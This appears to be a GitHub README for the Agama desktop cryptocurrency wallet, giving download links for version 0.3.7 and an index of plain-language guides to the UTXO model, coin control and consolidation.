[![Agama Wallet](assets/banner-hub.png)](https://github.com/agama-wallet/agama-desktop-wallet)

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>

All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---


## UTXO guides

A UTXO is an unspent transaction output: a chunk of coins that exists because an earlier transaction created it and nothing has spent it yet. Wallets built this way do not store a balance. They store keys, derive addresses, and add up whatever outputs those addresses can still spend. Almost every confusing thing about such a wallet follows from that one design decision.

These guides cover the model and then the consequences. Why a payment spends a whole output and returns the rest as change. How that differs from an account-based chain, where a balance is a number that goes up and down. Why two wallets can show different totals for the same keys, and why consolidating many small outputs saves fees while costing privacy.

The last few pages look outward: the Bitcoin output set that every node keeps, the chains that adopted the model and the ones that replaced it, and Cardano's version, where an output carries data and rules rather than only an amount. The final guide is about reading an open-source wallet's licence and history instead of trusting the word "open".

None of this requires a background in cryptography. It requires accepting that a coin is a receipt, not a number in an account. Each page is short on purpose: one idea, and the consequence of that idea spelled out.

---


## Start here


<div align="center">

| Guide | What it covers |
|---|---|
| [What Is a UTXO?](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md) | coins as outputs, spent whole and returned as change |
| [UTXO vs Account Model: How the Two Ledger Designs Differ](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md) | two ledger designs, and what each makes easy or awkward |
| [UTXOs in Bitcoin: How Coins Are Actually Held](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md) | no balance field anywhere, only outputs waiting to be spent |

</div>

## The model

<div align="center">

| Guide | What it covers |
|---|---|
| [What Is a UTXO?](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md) | coins as outputs, spent whole and returned as change |
| [UTXO vs Account Model: How the Two Ledger Designs Differ](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md) | two ledger designs, and what each makes easy or awkward |
| [UTXOs in Bitcoin: How Coins Are Actually Held](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md) | no balance field anywhere, only outputs waiting to be spent |
| [The Bitcoin UTXO Set: What It Is and Why It Grows](https://github.com/agama-wallet/utxo/blob/main/the-bitcoin-output-set.md) | the shared database every node keeps, and why it only grows |
| [Which Blockchains Use the UTXO Model](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md) | the chains that kept the model, and the ones that replaced it |
| [Cardano's Extended UTXO Model](https://github.com/agama-wallet/utxo/blob/main/cardano-extended-model.md) | outputs that carry data and rules, not just an amount |

</div>

## Handling your coins

<div align="center">

| Guide | What it covers |
|---|---|
| [UTXO Management: Consolidating and Labelling Your Coins](https://github.com/agama-wallet/utxo/blob/main/consolidating-your-coins.md) | fewer inputs, smaller transactions, and the privacy bill |
| [Coin Control: Choosing Which UTXOs a Transaction Spends](https://github.com/agama-wallet/utxo/blob/main/choosing-which-coins-to-spend.md) | picking inputs by age, size or label instead of by chance |
| [Why a UTXO Wallet Balance Is Not One Number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md) | what a wallet adds up, and why two wallets disagree |
| [Open-Source UTXO Projects Worth Reading](https://github.com/agama-wallet/utxo/blob/main/open-source-projects-worth-reading.md) | what a licence tells you, and what the commit history tells you |

</div>

## More guides

- [Agama Wallet guides](https://github.com/agama-wallet/agama-wallet) - the wallet itself - install, restore, versions, assets and the 2019 history
- [Atomic swap guides](https://github.com/agama-wallet/atomic-swaps) - trade mechanics, fees, refunds and the risks that remain


## About

Published alongside Agama Wallet, a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps. Download links point at the tagged GitHub release and nowhere else.

## License

MIT
